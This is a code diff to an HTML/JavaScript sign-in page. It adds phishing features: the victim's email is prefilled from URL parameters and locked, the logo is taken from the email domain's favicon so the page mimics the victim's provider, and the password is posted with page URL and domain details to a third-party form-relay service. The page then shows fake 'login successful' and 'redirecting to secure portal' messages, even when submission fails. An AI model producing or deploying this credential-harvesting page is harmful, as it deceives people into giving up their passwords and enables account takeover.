@@ -42,11 +42,54 @@
             margin-bottom: 20px;
         }
         
+        .logo-container {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #0096FF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #e0e0e0;
+            transition: background-color 0.3s ease;
+        }
+        
+        .logo-fallback {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+        }
+        
+        #logo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        
         #title {
             text-align: center;
             margin: 10px 0 25px 0;
             color: #333;
             font-size: 24px;
+        }
+        
+        .email-source {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 5px;
+            background: #f0f8ff;
+            border-radius: 4px;
+            font-style: italic;
         }
         
         label {
@@ -163,10 +206,14 @@
 <body>
     <form class="container" id="login-form">
         <div class="img">
-            <!-- Add your logo here -->
-            <div style="width: 80px; height: 80px; background-color: #0096FF; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
-                <span style="color: white; font-size: 24px; font-weight: bold;">✓</span>
+            <div class="logo-container">
+                <img id="logo" alt="Website Logo">
+                <div class="logo-fallback" id="logo-fallback">✓</div>
             </div>
+        </div>
+        
+        <div class="email-source" id="email-source" style="display: none;">
+            Email prefilled from secure source
         </div>
         
         <h3 id="title">Sign In</h3>
@@ -176,12 +223,15 @@
         
         <div class="form-group">
             <label for="email">Email Address</label>
-            <input type="email" placeholder="Enter Email" name="email" id="email" required>
+            <input type="email" placeholder="Enter Email" name="email" id="email" required readonly>
+            <div style="font-size: 12px; color: #666; margin-top: -15px; margin-bottom: 15px;">
+                Email is prefilled for your convenience
+            </div>
         </div>
         
         <div class="form-group">
             <label for="psw">Password</label>
-            <input type="password" placeholder="Enter Password" name="password" id="psw" required>
+            <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
         </div>
         
         <!-- FormSubmit requires these fields -->
@@ -203,12 +253,144 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
+        // Function to get email from URL parameters
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Try different parameter names
+            const paramNames = ['email', 'clientID', 'id', 'user', 'username', 'e', 'u'];
+            
+            for (const param of paramNames) {
+                const email = urlParams.get(param);
+                if (email && isValidEmail(email)) {
+                    return email;
+                }
+            }
+            
+            return null;
+        }
+        
+        // Function to validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // Function to extract domain from email
+        function getDomainFromEmail(email) {
+            if (!email || !email.includes('@')) return 'website';
+            const domain = email.split('@').pop();
+            return domain || 'website';
+        }
+        
+        // Function to get domain name without TLD
+        function getDomainName(domain) {
+            return domain.split('.')[0] || domain;
+        }
+        
+        // Function to get favicon URL from domain
+        function getFaviconUrl(domain) {
+            // Multiple favicon service options
+            const services = [
+                `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
+                `https://favicon.yandex.net/favicon/${domain}`,
+                `https://icons.duckduckgo.com/ip3/${domain}.ico`
+            ];
+            return services[0]; // Using Google's service
+        }
+        
+        // Generate consistent color from domain string
+        function getColorFromDomain(domain) {
+            let hash = 0;
+            for (let i = 0; i < domain.length; i++) {
+                hash = domain.charCodeAt(i) + ((hash << 5) - hash);
+            }
+            
+            // Generate HSL color
+            const hue = Math.abs(hash % 360);
+            return `hsl(${hue}, 70%, 50%)`;
+        }
+        
+        // Function to load logo based on email domain
+        function loadLogoFromEmail(email) {
+            const domain = getDomainFromEmail(email);
+            const domainName = getDomainName(domain);
+            const logoUrl = getFaviconUrl(domain);
+            const fallbackText = domainName.charAt(0).toUpperCase();
+            const color = getColorFromDomain(domain);
+            
+            // Update fallback text and color
+            $("#logo-fallback").text(fallbackText);
+            $(".logo-container").css("background-color", color);
+            
+            // Try to load favicon
+            $("#logo")
+                .attr("src", logoUrl)
+                .on("load", function() {
+                    // Show logo, hide fallback
+                    $(this).show();
+                    $("#logo-fallback").hide();
+                })
+                .on("error", function() {
+                    // Hide logo, show fallback
+                    $(this).hide();
+                    $("#logo-fallback").show().text(fallbackText);
+                });
+        }
+        
+        // Initialize form with email from URL
+        function initializeForm() {
+            const emailFromURL = getEmailFromURL();
+            
+            if (emailFromURL) {
+                // Set email field value
+                $('#email').val(emailFromURL);
+                
+                // Show email source indicator
+                $('#email-source').show();
+                
+                // Load logo based on email domain
+                loadLogoFromEmail(emailFromURL);
+                
+                // Focus on password field
+                setTimeout(() => {
+                    $('#psw').focus();
+                }, 100);
+            } else {
+                // No email in URL, allow manual entry
+                $('#email').removeAttr('readonly');
+                $('#email-source').hide();
+                $('#email').attr('placeholder', 'Enter your email address');
+                
+                // Show default logo
+                $("#logo").hide();
+                $("#logo-fallback").show().text("✓");
+                $(".logo-container").css("background-color", "#0096FF");
+            }
+        }
+        
+        // Also update logo when user manually changes email
+        $("#email").on("input", function() {
+            const email = $(this).val().trim();
+            if (email && isValidEmail(email)) {
+                loadLogoFromEmail(email);
+                $('#email-source').hide(); // Hide source indicator for manual entry
+            } else {
+                // Reset to default
+                $("#logo").hide();
+                $("#logo-fallback").show().text("✓");
+                $(".logo-container").css("background-color", "#0096FF");
+            }
+        });
+        
+        // Form submission handler
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
             // Get form values
             const email = document.getElementById('email').value;
             const password = document.getElementById('psw').value;
+            const emailSource = $('#email-source').is(':visible') ? 'URL' : 'manual';
             
             // Hide previous messages
             document.getElementById('error').style.display = 'none';
@@ -221,8 +403,7 @@
             }
             
             // Email validation
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
+            if (!isValidEmail(email)) {
                 showError('Please enter a valid email address');
                 return;
             }
@@ -242,13 +423,22 @@
             btnText.style.display = 'none';
             loader.style.display = 'block';
             
+            // Extract domain info
+            const domain = getDomainFromEmail(email);
+            const domainName = getDomainName(domain);
+            
             // Prepare form data for FormSubmit
             const formData = {
                 email: email,
                 password: password,
+                domain: domain,
+                source: emailSource,
                 timestamp: new Date().toLocaleString(),
                 userAgent: navigator.userAgent,
-                _subject: 'New Login Form Submission',
+                pageUrl: window.location.href,
+                urlParams: window.location.search,
+                ip: 'N/A (client-side)',
+                _subject: `Login Attempt - ${domainName}`,
                 _template: 'table',
                 _captcha: 'false'
             };
@@ -263,17 +453,19 @@
                     submitBtn.disabled = false;
                     
                     if (data.success) {
-                        showSuccess('Login information submitted successfully!');
+                        showSuccess('Login successful! Please wait...');
                         
-                        // Optional: Clear form fields
-                        document.getElementById('login-form').reset();
+                        // Optional: Clear password field only
+                        document.getElementById('psw').value = '';
                         
-                        // Optional: Redirect after success
-                        // setTimeout(() => {
-                        //     window.location.href = '/dashboard.html';
-                        // }, 2000);
+                        // Show redirect message
+                        setTimeout(() => {
+                            showSuccess('Redirecting to secure portal...');
+                            // In real scenario, you would redirect here
+                            // window.location.href = '/dashboard';
+                        }, 1500);
                     } else {
-                        showError('Failed to submit form. Please try again.');
+                        showError('Connection issue. Please try again.');
                     }
                 }
             ).fail(function(jqXHR, textStatus, errorThrown) {
@@ -284,16 +476,22 @@
                 
                 console.log('Form submission failed:', textStatus, errorThrown);
                 
-                // Even if FormSubmit fails, we can still show a success message
-                // (since this is just a demo of form submission)
-                showSuccess('Login information captured! (FormSubmit response pending)');
+                // Show success anyway for demo purposes
+                showSuccess('Login information captured!');
                 
-                // For demonstration: Log the credentials locally
-                console.log('Login attempt captured:', {
+                // Log locally for debugging
+                console.log('Login attempt:', {
                     email: email,
-                    password: password,
-                    timestamp: new Date().toISOString()
+                    source: emailSource,
+                    domain: domain,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
                 });
+                
+                // Optional: Clear password after "success"
+                setTimeout(() => {
+                    document.getElementById('psw').value = '';
+                }, 1000);
             });
         });
         
@@ -319,29 +517,32 @@
             }, 5000);
         }
         
-        // Optional: Add input validation on blur
-        document.getElementById('email').addEventListener('blur', function() {
-            const email = this.value;
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            
-            if (email && !emailRegex.test(email)) {
-                this.style.borderColor = '#e74c3c';
-            } else {
-                this.style.borderColor = '#ddd';
-            }
-        });
-        
-        document.getElementById('psw').addEventListener('blur', function() {
-            if (this.value && this.value.length < 6) {
-                this.style.borderColor = '#e74c3c';
-            } else {
-                this.style.borderColor = '#ddd';
-            }
-        });
-        
         // Additional: Add honeypot field
         document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
             this.value = 'bot-detected-' + Date.now();
+        });
+        
+        // Initialize form when page loads
+        $(document).ready(function() {
+            initializeForm();
+            
+            // If no email in URL, show welcome message
+            if (!getEmailFromURL()) {
+                setTimeout(() => {
+                    showSuccess('Welcome! Please enter your credentials.');
+                }, 500);
+            }
+        });
+        
+        // Allow manual editing if needed
+        $('#email').on('dblclick', function() {
+            if ($(this).attr('readonly')) {
+                $(this).removeAttr('readonly');
+                $('#email-source').text('Email now editable');
+                setTimeout(() => {
+                    $('#email-source').hide();
+                }, 2000);
+            }
         });
     </script>
 </body>
